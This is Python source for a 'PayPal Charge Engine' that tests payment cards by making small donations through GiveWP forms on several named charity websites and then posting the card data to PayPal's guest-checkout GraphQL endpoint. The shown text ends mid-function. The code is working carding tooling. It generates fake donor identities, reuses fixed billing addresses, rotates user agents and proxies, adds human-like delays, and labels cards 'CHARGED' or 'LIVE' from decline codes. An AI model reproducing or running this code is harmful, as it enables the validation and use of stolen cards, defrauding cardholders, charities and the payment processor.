"""
api/paypal_engine.py — PayPal Charge Engine (Vercel-adapted, no Playwright)
Uses plain requests instead of curl_cffi. GiveWP flow only.
"""

from __future__ import annotations

import random
import re
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

import requests
from faker import Faker
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]

GIVEWP_SITES: List[Dict[str, str]] = [
    {
        "name": "binnaclehouse.org",
        "url": "https://binnaclehouse.org/donation/",
        "origin": "https://binnaclehouse.org",
        "referer": "https://binnaclehouse.org/donation/",
        "form_title": "General Donations",
        "minimum": "1.00",
        "maximum": "999999.99",
    },
    {
        "name": "awwatersheds.org",
        "url": "https://awwatersheds.org/donate/",
        "origin": "https://awwatersheds.org",
        "referer": "https://awwatersheds.org/donate/",
        "form_title": "Donation",
        "minimum": "1.00",
        "maximum": "999999.99",
    },
    {
        "name": "forechrist.com",
        "url": "https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/",
        "origin": "https://www.forechrist.com",
        "referer": "https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/",
        "form_title": "Donation",
        "minimum": "1.00",
        "maximum": "999999.99",
    },
    {
        "name": "ccfoundationorg.com",
        "url": "https://ccfoundationorg.com/donate/",
        "origin": "https://ccfoundationorg.com",
        "referer": "https://ccfoundationorg.com/donate/",
        "form_title": "Donation",
        "minimum": "1.00",
        "maximum": "999999.99",
    },
]

GRAPHQL_QUERY = """
mutation payWithCard(
    $token: String!
    $card: CardInput
    $phoneNumber: String
    $firstName: String
    $lastName: String
    $shippingAddress: AddressInput
    $billingAddress: AddressInput
    $email: String
    $currencyConversionType: CheckoutCurrencyConversionType
) {
    approveGuestPaymentWithCreditCard(
        token: $token
        card: $card
        phoneNumber: $phoneNumber
        firstName: $firstName
        lastName: $lastName
        email: $email
        shippingAddress: $shippingAddress
        billingAddress: $billingAddress
        currencyConversionType: $currencyConversionType
    ) {
        flags { is3DSecureRequired }
        cart { cartId }
    }
}
"""

BILLING_ADDRESSES = [
    {"line1": "5112 N Tongass Hwy", "city": "Ketchikan", "state": "AK", "postalCode": "99901", "country": "US"},
    {"line1": "1900 S Glacier Ave", "city": "Ketchikan", "state": "AK", "postalCode": "99901", "country": "US"},
    {"line1": "1111 Stedman St",    "city": "Ketchikan", "state": "AK", "postalCode": "99901", "country": "US"},
    {"line1": "2933 Tongass Ave",  "city": "Ketchikan", "state": "AK", "postalCode": "99901", "country": "US"},
]

PHONE_POOL = ["9076178000", "9072254111", "9072284221", "9076174500", "4969615048"]

LIVE_DECLINE_KEYWORDS = [
    "INVALID_BILLING_ADDRESS", "EXISTING_ACCOUNT_RESTRICTED", "INVALID_SECURITY_CODE",
    "CVV2_FAILURE", "INVALID SECURITY CODE", "INSUFFICIENT_FUNDS", "CARD_REFUSED",
    "TRANSACTION_REFUSED", "RISK_DECLINE", "FRAUD", "AVS_DECLINE", "PROCESSING_ERROR",
]

faker = Faker()


def _human_delay(min_ms: float = 200, max_ms: float = 500) -> None:
    time.sleep(random.uniform(min_ms, max_ms) / 1000)


def _parse_cc(cc_str: str) -> Optional[Dict[str, str]]:
    parts = cc_str.split("|")
    if len(parts) < 4:
        return None
    n, mm, yy, cvc = [p.strip() for p in parts[:4]]
    if len(yy) == 4:
        yy = yy[2:]
    if not (n.isdigit() and mm.isdigit() and yy.isdigit() and cvc.isdigit()):
        return None
    return {"cc": n, "mm": mm, "yy": yy, "cvc": cvc}


def _parse_proxy(proxy: Optional[str]) -> Optional[Dict[str, str]]:
    if not proxy:
        return None
    proxy = proxy.strip()
    if "://" in proxy:
        return {"http": proxy, "https": proxy}
    parts = proxy.split(":")
    if len(parts) == 4:
        u = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return {"http": u, "https": u}
    u = f"http://{proxy}"
    return {"http": u, "https": u}


def _detect_card_type(card_number: str) -> str:
    n = card_number.replace(" ", "").replace("-", "")
    if n.startswith("4"):
        return "VISA"
    if re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n):
        return "MASTER_CARD"
    if n.startswith(("34", "37")):
        return "AMEX"
    if n.startswith(("6011", "65")):
        return "DISCOVER"
    if n.startswith(("3528", "3529", "353", "354", "355", "356", "357", "358")):
        return "JCB"
    if n.startswith("62"):
        return "CHINA_UNION_PAY"
    return "VISA"


def _format_amount(amount: Any) -> str:
    try:
        return f"{float(amount):.2f}"
    except (ValueError, TypeError):
        return "1.00"


def _gen_email(first: str, last: str) -> str:
    return f"{first.lower()}.{last.lower()}{random.randint(10000, 99999)}@gmail.com"


def _make_session(proxy: Optional[str] = None) -> requests.Session:
    s = requests.Session()
    s.verify = False
    retry = Retry(total=2, backoff_factor=1, status_forcelist=[408, 429, 500, 502, 503, 504])
    s.mount("http://", HTTPAdapter(max_retries=retry))
    s.mount("https://", HTTPAdapter(max_retries=retry))
    if proxy:
        s.proxies = proxy
    return s


class PayPalCharger:
    def __init__(self, site: Optional[str] = None, amount: Any = 1.00,
                 currency: str = "USD", proxy: Optional[str] = None):
        self.amount = _format_amount(amount)
        self.currency = currency.upper()
        self.proxy = _parse_proxy(proxy)
        self.session = _make_session(self.proxy)
        self.site_config = self._resolve_site_config(site) if site else None
        if not self.site_config:
            self.site_config = GIVEWP_SITES[0]
        self.user_agent = random.choice(UA_POOL)
        Faker.seed(random.randint(0, 2**31 - 1))

    def _resolve_site_config(self, site: str) -> Optional[Dict[str, str]]:
        host = urlparse(site).hostname or site.lower().strip()
        for s in GIVEWP_SITES:
            if s["name"] in host or host in s["name"]:
                return s
        if site.startswith("http"):
            p = urlparse(site)
            return {
                "name": p.netloc, "url": site,
                "origin": f"{p.scheme}://{p.netloc}",
                "referer": site, "form_title": "Donation",
                "minimum": "1.00", "maximum": "999999.99",
            }
        return None

    def _extract_givewp_tokens(self, html: str) -> Optional[Dict[str, str]]:
        try:
            pre = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
            fid = re.search(r'name="give-form-id"\s+value="([^"]+)"', html)
            fh  = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
            if not (pre and fid and fh):
                return None
            return {"prefix": pre.group(1), "id": fid.group(1), "hash": fh.group(1)}
        except Exception:
            return None

    def _get_donation_page(self) -> Tuple[Optional[Dict[str, str]], Dict[str, Any]]:
        url = self.site_config["url"]
        headers = {
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Upgrade-Insecure-Requests": "1",
        }
        r = self.session.get(url, headers=headers, timeout=20, allow_redirects=True)
        info = {"url": url, "status": r.status_code, "length": len(r.text)}
        return self._extract_givewp_tokens(r.text), info

    def _process_donation(self, tokens: Dict[str, str], donor: Dict[str, str]) -> Dict[str, Any]:
        url = f"{self.site_config['origin']}/wp-admin/admin-ajax.php"
        headers = {
            "User-Agent": self.user_agent,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": self.site_config["origin"],
            "Referer": self.site_config["referer"],
            "X-Requested-With": "XMLHttpRequest",
        }
        data = {
            "give-honeypot": "",
            "give-form-id-prefix": tokens["prefix"],
            "give-form-id": tokens["id"],
            "give-form-title": self.site_config["form_title"],
            "give-current-url": self.site_config["url"],
            "give-form-url": self.site_config["url"],
            "give-form-minimum": self.site_config["minimum"],
            "give-form-maximum": self.site_config["maximum"],
            "give-form-hash": tokens["hash"],
            "give-price-id": "custom",
            "give-amount": self.amount,
            "payment-mode": "paypal-commerce",
            "give_title": donor["title"],
            "give_first": donor["first_name"],
            "give_last": donor["last_name"],
            "give_email": donor["email"],
            "give_action": "purchase",
            "give-gateway": "paypal-commerce",
            "action": "give_process_donation",
            "give_ajax": "true",
        }
        r = self.session.post(url, headers=headers, data=data, timeout=20)
        return {"url": url, "status": r.status_code, "length": len(r.text),
                "body_preview": r.text[:200], "ok": "success" in r.text.lower()}

    def _create_paypal_order(self, tokens: Dict[str, str]) -> Tuple[Optional[str], Dict[str, Any]]:
        url = f"{self.site_config['origin']}/wp-admin/admin-ajax.php"
        params = {"action": "give_paypal_commerce_create_order"}
        headers = {
            "User-Agent": self.user_agent,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": self.site_config["origin"],
            "Referer": self.site_config["referer"],
            "X-Requested-With": "XMLHttpRequest",
        }
        data = {
            "give-honeypot": "",
            "give-form-id-prefix": tokens["prefix"],
            "give-form-id": tokens["id"],
            "give-form-hash": tokens["hash"],
            "payment-mode": "paypal-commerce",
            "give-amount": self.amount,
            "give-gateway": "paypal-commerce",
        }
        r = self.session.post(url, params=params, headers=headers, data=data, timeout=20)
        info = {"url": url, "status": r.status_code, "length": len(r.text),
                "body_preview": r.text[:300]}
        order_id = None
        try:
            j = r.json()
            info["json"] = j
            if isinstance(j, dict) and j.get("success") and isinstance(j.get("data"), dict):
                order_id = j["data"].get("id")
        except Exception as e:
            info["json_error"] = str(e)
        return order_id, info

    def _submit_card_to_paypal(self, order_id: str, cc: str, mm: str, yy: str,
                               cvc: str, donor: Dict[str, str]) -> Dict[str, Any]:
        bill = random.choice(BILLING_ADDRESSES)
        phone = random.choice(PHONE_POOL)
        exp_date = f"{mm}/{yy}" if len(yy) == 4 else f"{mm}/20{yy}"
        card_type = _detect_card_type(cc)

        variables = {
            "token": order_id,
            "card": {
                "cardNumber": cc, "type": card_type,
                "expirationDate": exp_date,
                "postalCode": bill["postalCode"],
                "securityCode": cvc,
            },
            "phoneNumber": phone,
            "firstName": donor["first_name"],
            "lastName": donor["last_name"],
            "email": donor["email"],
            "billingAddress": {
                "givenName": donor["first_name"], "familyName": donor["last_name"],
                "line1": bill["line1"], "line2": None,
                "city": bill["city"], "state": bill["state"],
                "postalCode": bill["postalCode"], "country": bill["country"],
            },
            "shippingAddress": {
                "givenName": donor["first_name"], "familyName": donor["last_name"],
                "line1": bill["line1"], "line2": None,
                "city": bill["city"], "state": bill["state"],
                "postalCode": bill["postalCode"], "country": bill["country"],
            },
            "currencyConversionType": "PAYPAL",
        }
        headers = {
            "Paypal-Client-Context": order_id,
            "Paypal-Client-Metadata-Id": order_id,
            "X-App-Name": "standardcardfields",
            "User-Agent": self.user_agent,
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://www.paypal.com",
            "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
        }
        r = self.session.post(
            "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
            headers=headers, json={"query": GRAPHQL_QUERY, "variables": variables},
            timeout=25,
        )
        info: Dict[str, Any] = {"url": r.url, "status": r.status_code,
                                "length": len(r.text), "raw_body": r.text[:1500]}
        try:
            j = r.json()
            info["json"] = j
            if "errors" in j and j["errors"]:
                first = j["errors"][0]
                msg = first.get("message", "Unknown error")
                code = ""
                details = first.get("data") or []
                if details and isinstance(details, list) and details:
                    code = (details[0] or {}).get("code", "")
                info["paypal_error_message"] = msg
                info["paypal_error_code"] = code
            if j.get("data", {}).get("approveGuestPaymentWithCreditCard"):
                info["approved"] = True
        except Exception as e:
            info["json_error"] = str(e)
        return info

    def charge(self, cc_str: str) -> Dict[str, Any]:
        t0 = time.time()
        out: Dict[str, Any] = {
            "input": None,
            "site": {"name": self.site_config["name"], "url": self.site_config["url"]},
            "amount": self.amount, "currency": self.currency,
            "donor": None, "steps": {}, "paypal_order_id": None,
            "response": "ERROR", "message": "", "raw_response": None,
            "duration_sec": 0.0,
        }
        parsed = _parse_cc(cc_str)
        if not parsed:
            out["message"] = "Invalid CC format. Use CC|MM|YY|CVC."
            out["duration_sec"] = round(time.time() - t0, 2)
            return out
        cc, mm, yy, cvc = parsed["cc"], parsed["mm"], parsed["yy"], parsed["cvc"]
        out["input"] = {"cc": cc, "mm": mm, "yy": yy, "cvc": cvc,
                        "card_brand": _detect_card_type(cc), "last4": cc[-4:]}

        first = faker.first_name()
        last = faker.last_name()
        donor = {"first_name": first, "last_name": last,
                 "email": _gen_email(first, last),
                 "title": random.choice(["Mr.", "Ms.", "Mrs.", "Dr."])}
        out["donor"] = donor

        try:
            tokens, page_info = self._get_donation_page()
            out["steps"]["get_page"] = page_info
            if not tokens:
                out["message"] = "GiveWP tokens not found. Try /discover to find working sites."
                out["duration_sec"] = round(time.time() - t0, 2)
                return out
            out["tokens"] = tokens
        except Exception as e:
            out["steps"]["get_page"] = {"error": str(e)[:200]}
            out["message"] = f"Failed to fetch donation page: {e}"
            out["duration_sec"] = round(time.time() - t0, 2)
            return out

        _human_delay(200, 500)

        try:
            pd = self._process_donation(tokens, donor)
            out["steps"]["process_donation"] = pd
        except Exception as e:
            out["steps"]["process_donation"] = {"error": str(e)[:200]}

        _human_delay(200, 500)

        try:
            order_id, order_info = self._create_paypal_order(tokens)
            out["steps"]["create_order"] = order_info
            out["paypal_order_id"] = order_id
            if not order_id:
                out["message"] = "PayPal order creation failed."
                out["duration_sec"] = round(time.time() - t0, 2)
                return out
        except Exception as e:
            out["steps"]["create_order"] = {"error": str(e)[:200]}
            out["message"] = f"Order creation error: {e}"
            out["duration_sec"] = round(time.time() - t0, 2)
            return out

        _human_delay(300, 700)

        try:
            sc = self._submit_card_to_paypal(order_id, cc, mm, yy, cvc, donor)
            out["steps"]["submit_card"] = sc
            out["raw_response"] = sc.get("json") or sc.get("raw_body")
            j = sc.get("json") or {}
            if j.get("data", {}).get("approveGuestPaymentWithCreditCard"):
                out["response"] = "CHARGED"
                out["message"] = "Payment successfully charged via PayPal."
            elif "errors" in j and j["errors"]:
                first_err = j["errors"][0]
                msg = first_err.get("message", "Unknown error")
                code = ""
                details = first_err.get("data") or []
                if details and isinstance(details, list) and details:
                    code = (details[0] or {}).get("code", "")
                full = f"{msg} ({code})" if code else msg
                if any(kw in full.upper() for kw in LIVE_DECLINE_KEYWORDS):
                    out["response"] = "APPROVED"
                    out["message"] = f"Card LIVE but PayPal declined: {full}"
                else:
                    out["response"] = "DECLINED"
                    out["message"] = f"Declined: {full}"
            else:
                out["response"] = "UNKNOWN"
                out["message"] = f"Unexpected response: {sc.get('raw_body','')[:200]}"
        except Exception as e:
            out["steps"]["submit_card"] = {"error": str(e)[:300]}
            out["response"] = "ERROR"
            out["message"] = f"Card submission error: {e}"

        out["duration_sec"] = round(time.time() - t0, 2)
        return out


def discover_sites(extra_urls: Optional[List[str]] = None, timeout: int = 8) -> List[Dict[str, Any]]:
    candidates = list(GIVEWP_SITES)
    if extra_urls:
        for u in extra_urls:
            p = urlparse(u)
            candidates.append({
                "name": p.hostname or u, "url": u,
                "origin": f"{p.scheme}://{p.netloc}", "referer": u,
                "form_title": "Donation", "minimum": "1.00", "maximum": "999999.99",
            })
    UA = random.choice(UA_POOL)
    results = []
    for s in candidates:
        info = {"name": s["name"], "url": s["url"], "status": None, "length": 0,
                "has_givewp_form": False, "has_paypal_commerce": False,
                "tokens_extractable": False, "error": None}
        try:
            sess = _make_session()
            sess.headers.update({"User-Agent": UA})
            r = sess.get(s["url"], timeout=timeout, allow_redirects=True)
            info["status"] = r.status_code
            info["length"] = len(r.text)
            info["has_givewp_form"] = 'name="give-form-id-prefix"' in r.text
            info["has_paypal_commerce"] = "paypal-commerce" in r.text.lower()
            info["tokens_extractable"] = info["has_givewp_form"]
        except Exception as 
